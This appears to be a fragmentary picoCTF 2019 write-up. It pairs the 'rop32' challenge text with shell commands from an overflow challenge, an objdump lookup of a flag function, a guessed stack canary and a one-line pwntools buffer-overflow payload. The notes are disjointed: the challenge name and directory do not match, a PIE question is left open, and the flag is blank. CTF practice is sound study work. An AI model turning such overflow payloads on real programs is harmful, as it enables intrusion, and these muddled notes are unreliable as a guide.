# AUR

rop32 - Points: 400 - (Solves: 115)Binary Exploitation - Unsolved
Solve
Hints
Can you exploit the following program to get a flag? You can find the program in /problems/rop32_5_890e5a888b8eea67474a6f4abb7ac81d on the shell server. Source.
This is a classic ROP to get a shell

***

2kofawsome@pico-2019-shell1:~$ cd /problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446

2kofawsome@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ objdump -t vuln | grep flag
000007ed g     F .text  00000090              flag
but it is PIE?



Canary is 57Gh

Final payload:

python -c 'from pwn import * ;print "a"*32 + "57Gh" + "a"*60 + p32(0x000007ed)'



Flag:

picoCTF{}

